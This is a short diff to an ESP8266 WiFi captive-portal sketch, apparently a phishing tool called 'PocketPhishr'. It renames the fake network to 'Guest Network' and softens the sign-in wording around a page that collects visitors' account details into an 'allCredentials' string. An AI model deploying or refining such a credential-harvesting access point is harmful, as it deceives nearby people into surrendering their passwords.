@@ -1,7 +1,6 @@
 // ESP8266 WiFi Captive Portal
 // https://github.com/adamff1/ESP8266_WiFi_Captive_Portal_2.0
-
-
+// https://github.com/AnotherWayIn/PocketPhishr
 
 
 // Includes
@@ -16,10 +15,10 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char* SSID_NAME = "Guest Network";
 
 
-#define SUBTITLE "Free WiFi Service."
+#define SUBTITLE "Complimentary Access"
 #define TITLE "Sign in:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
@@ -37,7 +36,7 @@ U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/14, /* data=*/12, /
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(172, 0, 0, 1);  // Gateway
+IPAddress APIP(172, 16, 0, 1);  // Gateway
 
 String allCredentials = "";
 String newSSID = "";
